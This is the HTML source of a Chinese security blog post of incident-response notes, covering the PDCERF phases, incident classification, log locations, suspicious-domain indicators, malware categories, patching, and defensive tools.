<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>应急响应 | intenのblog🍦</title>
<meta name="keywords" content="应急响应" />
<meta name="description" content="https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记
https://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）
方法论 浅谈我所理解的应急响应流程
https://www.freebuf.com/column/193690.html应急响应的整体思路和基本流程
https://www.freebuf.com/articles/terminal/192859.html应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。
应急响应流程 业内通常使用的
PDCERF方法学 准备阶段——&gt;检测阶段——&gt;抑制阶段——&gt;根除阶段——&gt;恢复阶段——&gt;跟踪总结
准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。
准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。
检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。
检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。
备注：事件类型分类
安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件
抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。
根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。
恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。
跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。
跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。
常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。
**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。
**深入分析：**日志分析、进程分析、启动项分析、样本分析。
**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。
**产出报告：**整理并输出完整的安全事件报告。
系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。
**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。
**应用日志：**包括但不限于Web应用等众多繁杂的日志。
 Windows系统日志
 日志路径：C:\Windows\System32\winevt\Logs
必看日志：Security.evtx、System.evtx、Application.evtx
 Linux系统日志
 日志路径：/var/log
必看日志：secure、history
 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。
威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。
域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。
随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.">
<meta name="author" content="">
<link rel="canonical" href="https://inten.kro1lsec.com/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" />
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.84cc6e7cd97516a4d4e877c6bebe5a4529afdf61f4d009e2c8bbec3a876fff4e.css" integrity="sha256-hMxufNl1FqTU6HfGvr5aRSmv32H00AniyLvsOodv/04=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://inten.kro1lsec.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://inten.kro1lsec.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://inten.kro1lsec.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://inten.kro1lsec.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://inten.kro1lsec.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.82.0" />
<meta property="og:title" content="应急响应" />
<meta property="og:description" content="https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记
https://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）
方法论 浅谈我所理解的应急响应流程
https://www.freebuf.com/column/193690.html应急响应的整体思路和基本流程
https://www.freebuf.com/articles/terminal/192859.html应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。
应急响应流程 业内通常使用的
PDCERF方法学 准备阶段——&gt;检测阶段——&gt;抑制阶段——&gt;根除阶段——&gt;恢复阶段——&gt;跟踪总结
准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。
准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。
检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。
检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。
备注：事件类型分类
安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件
抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。
根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。
恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。
跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。
跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。
常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。
**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。
**深入分析：**日志分析、进程分析、启动项分析、样本分析。
**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。
**产出报告：**整理并输出完整的安全事件报告。
系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。
**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。
**应用日志：**包括但不限于Web应用等众多繁杂的日志。
 Windows系统日志
 日志路径：C:\Windows\System32\winevt\Logs
必看日志：Security.evtx、System.evtx、Application.evtx
 Linux系统日志
 日志路径：/var/log
必看日志：secure、history
 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。
威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。
域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。
随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://inten.kro1lsec.com/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-15T15:07:34&#43;08:00" />
<meta property="article:modified_time" content="2021-04-15T15:07:34&#43;08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="应急响应"/>
<meta name="twitter:description" content="https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记
https://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）
方法论 浅谈我所理解的应急响应流程
https://www.freebuf.com/column/193690.html应急响应的整体思路和基本流程
https://www.freebuf.com/articles/terminal/192859.html应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。
应急响应流程 业内通常使用的
PDCERF方法学 准备阶段——&gt;检测阶段——&gt;抑制阶段——&gt;根除阶段——&gt;恢复阶段——&gt;跟踪总结
准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。
准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。
检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。
检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。
备注：事件类型分类
安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件
抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。
根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。
恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。
跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。
跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。
常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。
**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。
**深入分析：**日志分析、进程分析、启动项分析、样本分析。
**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。
**产出报告：**整理并输出完整的安全事件报告。
系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。
**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。
**应用日志：**包括但不限于Web应用等众多繁杂的日志。
 Windows系统日志
 日志路径：C:\Windows\System32\winevt\Logs
必看日志：Security.evtx、System.evtx、Application.evtx
 Linux系统日志
 日志路径：/var/log
必看日志：secure、history
 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。
威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。
域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。
随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://inten.kro1lsec.com/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "应急响应",
      "item": "https://inten.kro1lsec.com/post/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "应急响应",
  "name": "应急响应",
  "description": "https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记\nhttps://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）\n方法论 浅谈我所理解的应急响应流程\nhttps://www.freebuf.com/column/193690.html\r应急响应的整体思路和基本流程\nhttps://www.freebuf.com/articles/terminal/192859.html\r应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。\n应急响应流程 业内通常使用的\nPDCERF方法学 准备阶段——\u0026gt;检测阶段——\u0026gt;抑制阶段——\u0026gt;根除阶段——\u0026gt;恢复阶段——\u0026gt;跟踪总结\n准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。\n准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。\n检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。\n检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。\n备注：事件类型分类\n安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件\n抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。\n根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。\n恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。\n跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。\n跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。\n常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。\n**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。\n**深入分析：**日志分析、进程分析、启动项分析、样本分析。\n**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。\n**产出报告：**整理并输出完整的安全事件报告。\n系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。\n**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。\n**应用日志：**包括但不限于Web应用等众多繁杂的日志。\n Windows系统日志\n 日志路径：C:\\Windows\\System32\\winevt\\Logs\n必看日志：Security.evtx、System.evtx、Application.evtx\n Linux系统日志\n 日志路径：/var/log\n必看日志：secure、history\n 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。\n威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。\n域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。\n随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.",
  "keywords": [
    "应急响应"
  ],
  "articleBody": "https://bypass007.github.io/Emergency-Response-Notes/ 应急响应笔记\nhttps://www.cnblogs.com/H4ck3R-XiX/p/12234762.html Nmap使用教程（进阶篇）\n方法论 浅谈我所理解的应急响应流程\nhttps://www.freebuf.com/column/193690.html\r应急响应的整体思路和基本流程\nhttps://www.freebuf.com/articles/terminal/192859.html\r应急响应方式 现场应急响应：通常是要到客户突发现场进行应急处置。需注意相关操作必须获得用户授权，并对操作过程进行记录。 远程应急响应：远程通过电话、邮件等方式指导用户进行应急处置。\n应急响应流程 业内通常使用的\nPDCERF方法学 准备阶段——检测阶段——抑制阶段——根除阶段——恢复阶段——跟踪总结\n准备阶段 准备阶段需要及时和客户确认事件背景、相关负责人联系方式、确定参与此次应急响应人员、根据客户描述，初步判定事件响应策略，携带应急响应工具包前往客户现场。\n准备阶段主要包括：事件背景、响应人员确定、事件响应策略、相关负责人联系方式、应急响应相关授权、应急响应工具包、应急响应手册等。\n检测阶段 检测阶段确认入侵事件是否发生，如真发生了入侵事件，评估造成的危害、范围以及发展的速度，事件会不会进一步升级。然后根据评估结果通知相关的人员进入应急的流程。\n检测阶段主要包括：事件类型、事件影响范围、受影响系统、事件发展趋势、安全设备等。\n备注：事件类型分类\n安全事件分类主要参考中央网信办发布《国家网络安全事件应急预案》，网络安全事件分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他网络安全事件等。 （1）有害程序事件分为计算机病毒事件、蠕虫事件、特洛伊木马事件、僵尸网络事件、混合程序攻击事件、网页内嵌恶意代码事件和其他有害程序事件。 （2）网络攻击事件分为拒绝服务攻击事件、后门攻击事件、漏洞攻击事件、网络扫描窃听事件、网络钓鱼事件、干扰事件和其他网络攻击事件。 （3）信息破坏事件分为信息篡改事件、信息假冒事件、信息泄露事件、信息窃取事件、信息丢失事件和其他信息破坏事件。 （4）信息内容安全事件是指通过网络传播法律法规禁止信息，组织非法串联、煽动集会游行或炒作敏感问题并危害国家安全、社会稳定和公众利益的事件。 （5）设备设施故障分为软硬件自身故障、外围保障设施故障、人为破坏事故和其他设备设施故障。 （6）灾害性事件是指由自然灾害等其他突发事件导致的网络安全事件。 （7）其他事件是指不能归为以上分类的网络安全事件\n抑制阶段 采用针对性的安全措施降低事件损失、避免安全事件的扩散和安全事件对受害系统的持续性破坏。主要分为：物理遏制、网络遏制、主机遏制、应用遏制等。常见手段：断网、降权、网络封堵等。\n根除阶段 本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。\n恢复阶段 恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。\n跟踪阶段 在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。\n跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。\n常规流程 **收集信息：**收集客户信息和中毒主机信息，包括样本。\n**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。\n**深入分析：**日志分析、进程分析、启动项分析、样本分析。\n**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。\n**产出报告：**整理并输出完整的安全事件报告。\n系统日志及日志分析 日志类型  **Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。\n**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。\n**应用日志：**包括但不限于Web应用等众多繁杂的日志。\n Windows系统日志\n 日志路径：C:\\Windows\\System32\\winevt\\Logs\n必看日志：Security.evtx、System.evtx、Application.evtx\n Linux系统日志\n 日志路径：/var/log\n必看日志：secure、history\n 威胁情报的作用 威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。\n威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。\n域名 威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。\n随机域名（DGA）： 动态域名： 动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.3322.org （3322.org就是动态域名提供者，子域名abc.3322.org可以被别人所使用）。\n近期域名： 域名都是有创建时间（注册时间）的，Alexa全球排名百万之内的域名，都是很早之前就注册了的，从几年到十几、二十几年不等。黑客攻击要逃避防火墙的封堵，极可能在实施的时候，再去注册一个域名\n暗网代理域名： 暗网，也叫Tor网络，此网络的访问、传输流量是不可追踪溯源的，因此是黑色产业链的温床。要访问暗网，要么病毒自己实现Tor客户端，要么通过Tor代理来访问Tor网络，而通过Tor代理访问的流量是未加密的，其直接使用Tor代理访问Tor站点服务器。\n因此，暗网代理域名是可以被检测到的。\n例如访问https://abbujjh5vqtq77wg.onion.link/由于二级域名onion.link属于Tor代理域名，所以认定此次访问行为是Tor网络访问行为，且为非法访问可能性极高。\n顶级域名： 不是所有的顶级域名都需要特别关注，要从客户业务出发，去反推客户主机为何要访问相关的顶级域名。也就是说，这里面有一批顶级域名，实际客户业务是不需要去访问的，那么剩下的就只有黑客行为了\n就是这样一批顶级域名（包括但不限于以下顶级域名）：\n   顶级域名 申请地区或机构 为何重点关注     .ru 俄罗斯 俄罗斯盛产黑客   .ws 东萨摩亚 不知名国家，易申请，难追踪注册者   .cc 科科斯群岛 不知名国家，易申请，难追踪注册者   .pw 帕劳 不知名国家，易申请，难追踪注册者   .bz 伯利兹 不知名国家，易申请，难追踪注册者   .su 苏联 前苏联虽然解体了，顶级域名还在使用，且多与黑产有关   .bw 伯兹瓦纳 不知名国家，易申请，难追踪注册者   .gw 几内亚比绍 不知名国家，易申请，难追踪注册者   .ms 蒙塞拉特岛 不知名国家，易申请，难追踪注册者   .mz 莫桑比克 不知名国家，易申请，难追踪注册者    这里举个例子，我们在某台告警主机上，使用Wireshark抓网络网络，直接过滤DNS协议如下：\n可以看到，此主机解析了大量.pw站点的域名，如koqqveoukgjc.pw，.pw是帕劳国家顶级域名，此国家是一个非常小的岛国，跟中国大陆都没有建交，国内企业有需要访问他们站点的可能性低到零（或者有业务在帕劳的可能性）\n常见病毒及分类 勒索病毒：能对用户文件进行加密的病毒。\n挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。\n **蠕虫：**自动复制自身的副本到其它主机的病毒。\n**木马：**隐蔽性强，多用于监控用户行为或盗取用户数据的病毒。\n**感染型病毒：**能将自身恶意代码插入正常文件的病毒。\n**脚本病毒：**使用脚本编写的病毒。\n**宏病毒：**宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。\n**僵尸网络病毒：**能形成大型的一对多，多对多控制的远程控制病毒。\n**后门：**在主机上开放端口允许远程非授权访问。\n 漏洞和补丁 漏洞和补丁，在应急响应中是不可或缺。如果黑客是通过某种漏洞入侵系统的，而在应急响应中，无法找出黑客所利用的漏洞，就会意味着，入侵行为可以反复发生。在终端侧，就会表现为病毒清理不干净，杀了又来，所以一定要找出漏洞。\n找到漏洞后，就需要打上相应的补丁，这样才是一次完整的处置。\n查看系统补丁情况：\nWindows：直接打开cmd，输入命令systeminfo即可获取。\n **漏洞是什么：**漏洞是指一个系统存在的弱点或缺陷。\n**怎么来的：**系统设计时的缺陷或编码时产生的错误。\n**有什么后果：**黑客的侵入及病毒的驻留，数据丢失和篡改、隐私泄露，系统被控制并作为入侵其他主机系统的跳板，等等。\n**解决方法：**打补丁。\n 工具 红蓝对抗安全工具汇总https://blog.csdn.net/littleliuing/article/details/109745934\n**流量分析工具：**常用的流量分析工具是Wireshark、TCPView，也可以使用科来网络分析工具，Linux下对tcpdump比较熟悉的，也可以使用tcpdump。\n**进程分析工具：**能对进程相关联信息进行分析的工具，主要是ProcessHacker和PC Hunter等。\n**启动项分析工具：**主要是AutoRuns工具，便于定位病毒启动项。\n**专杀工具：**有些流行病毒家族，通常对杀软有抑制性，或者本身有感染性，需要专杀工具去查杀和修复正常文件。\n**辅助工具：**WinHex、文件Hash工具、Everything搜索工具、Unlocker文件解锁工具等。\n**内存扫描工具：**主要是MemScanner\n应急响应脚本:1997CN/Emergency\nhttps://github.com/1997CN/Emergency\rLinux主机排查:grayddq/GScan\nhttps://github.com/grayddq/GScan\rlinux安全检查:T0xst/linux\nhttps://github.com/T0xst/linux\rlinux信息收集/应急响应/常见后门检测脚本:al0ne/LinuxCheck\nhttps://github.com/al0ne/LinuxCheck\rNmap (“Network 